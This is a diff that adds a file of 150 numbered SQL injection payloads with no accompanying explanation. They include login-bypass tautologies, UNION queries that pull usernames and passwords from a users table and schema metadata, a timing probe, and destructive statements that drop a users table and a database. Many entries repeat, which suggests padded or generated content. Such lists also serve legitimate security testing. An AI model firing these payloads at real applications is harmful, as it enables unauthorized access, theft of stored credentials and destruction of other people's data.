@@ -1,0 +1,150 @@
+1. ' OR 1=1 --
+2. ' OR 'a'='a
+3. ' OR 1=1# 
+4. ' UNION SELECT null, null, null --
+5. ' UNION SELECT 1, 2, 3, 4 --
+6. ' AND 1=1 --
+7. ' AND 'a'='a
+8. ' OR 1=1 LIMIT 1,1 --
+9. ' OR 1=1# --
+10. ' AND 1=1# --
+11. ' UNION SELECT user(), database() --
+12. ' UNION SELECT table_name FROM information_schema.tables --
+13. ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+14. ' AND 1=0 UNION SELECT null, username, password FROM users --
+15. ' UNION SELECT null, username, password FROM users --
+16. ' UNION SELECT null, version() --
+17. ' OR EXISTS(SELECT * FROM users WHERE username='admin') --
+18. ' AND 1=1 WAITFOR DELAY '0:0:5' --
+19. ' OR 1=1; DROP TABLE users --
+20. ' OR 1=1; -- 
+21. ' OR 1=2 --
+22. ' OR 1=1 LIMIT 1 --
+23. ' AND 1=2 --
+24. ' AND 1=1 --
+25. ' AND 2=2 --
+26. ' OR 1=1; -- --
+27. ' AND username IS NULL --
+28. ' OR 1=1; DROP DATABASE test --
+29. ' OR 1=1 --#
+30. ' OR 2=2 --
+31. ' OR 3=3 --
+32. ' AND 3=3 --
+33. ' UNION SELECT null, null, null, null --
+34. ' OR 1=1 --
+35. ' AND 1=1 --
+36. ' OR 1=1 --
+37. ' AND user() --
+38. ' OR database() --
+39. ' AND version() --
+40. ' AND SYSTEM_USER() --
+41. ' UNION SELECT username, password FROM users --
+42. ' OR 1=1 LIMIT 1 OFFSET 0 --
+43. ' OR 'a'='b' --
+44. ' UNION SELECT null, null, null, null --
+45. ' UNION SELECT null, null --
+46. ' UNION SELECT null, null, null --
+47. ' OR 1=1 --
+48. ' OR 1=1 --
+49. ' UNION SELECT 1, 1 --
+50. ' OR 1=1 --
+51. ' OR 2=2 --
+52. ' AND 1=1 --
+53. ' OR 'a'='a' --
+54. ' OR '' = ''
+55. ' AND 1=1 --
+56. ' AND 'a'='b' --
+57. ' UNION SELECT user() --
+58. ' UNION SELECT 1,2,3 --
+59. ' UNION SELECT null, null --
+60. ' OR 1=1 --
+61. ' OR 'a' = 'a' --
+62. ' OR '1'='1' --
+63. ' OR 1=1 --
+64. ' AND 1=1 --
+65. ' OR ''='' --
+66. ' OR 1=2 --
+67. ' OR 2=2 --
+68. ' AND 1=0 --
+69. ' OR '1'='2' --
+70. ' OR 'a' = 'b' --
+71. ' AND 1=0 --
+72. ' AND 1=2 --
+73. ' OR 1=1 --
+74. ' UNION SELECT null, 1, 2 --
+75. ' UNION SELECT 1, 2, 3 --
+76. ' OR 1=1 --
+77. ' AND 1=0 --
+78. ' AND 1=2 --
+79. ' AND 0=0 --
+80. ' AND 1=0 --
+81. ' OR 1=1 --
+82. ' OR 2=2 --
+83. ' OR 1=0 --
+84. ' OR 1=1 --
+85. ' AND 'a' = 'a' --
+86. ' OR 'a' = 'a' --
+87. ' OR 1=1 --
+88. ' OR 'admin'='admin' --
+89. ' OR '1'='1' --
+90. ' UNION SELECT 1, 2, 3 --
+91. ' UNION SELECT 1, 2, 3, 4 --
+92. ' AND 1=2 --
+93. ' AND 1=1 --
+94. ' UNION SELECT NULL, NULL --
+95. ' AND 1=1 --
+96. ' OR 'admin' = 'admin' --
+97. ' AND 1=1 --
+98. ' AND 1=0 --
+99. ' UNION SELECT NULL, NULL --
+100. ' OR 1=1 --
+101. ' UNION SELECT username, password FROM users --
+102. ' OR 1=1 --
+103. ' OR 1=1 --
+104. ' OR 'a' = 'a' --
+105. ' AND 1=1 --
+106. ' AND 1=2 --
+107. ' OR 2=2 --
+108. ' UNION SELECT 1, 2, 3 --
+109. ' OR 1=1 --
+110. ' AND 1=2 --
+111. ' OR 1=1 --
+112. ' UNION SELECT username, password FROM users --
+113. ' OR '1'='2' --
+114. ' OR 'a'='b' --
+115. ' UNION SELECT null, null --
+116. ' OR '' = ''
+117. ' OR 1=1 --
+118. ' UNION SELECT null, version() --
+119. ' OR ''='' --
+120. ' OR 1=1 --
+121. ' AND 1=1 --
+122. ' OR 1=1 --
+123. ' OR 1=1 --
+124. ' UNION SELECT username, password --
+125. ' AND 1=1 --
+126. ' OR 'a'='a' --
+127. ' AND 1=0 --
+128. ' UNION SELECT null, null --
+129. ' OR '1'='2' --
+130. ' AND 1=2 --
+131. ' UNION SELECT null, database() --
+132. ' UNION SELECT 1, 2 --
+133. ' AND user() --
+134. ' UNION SELECT 1, 2, 3 --
+135. ' OR 1=1 --
+136. ' AND 1=0 --
+137. ' UNION SELECT null, null, null --
+138. ' OR 1=1 --
+139. ' UNION SELECT version(), null --
+140. ' OR 1=1 --
+141. ' AND 2=2 --
+142. ' AND 1=1 --
+143. ' UNION SELECT username, password FROM users --
+144. ' OR '1'='1' --
+145. ' AND 1=1 --
+146. ' OR 1=2 --
+147. ' AND 1=2 --
+148. ' OR 1=1 --
+149. ' UNION SELECT 1, 2 --
+150. ' OR 1=1 --
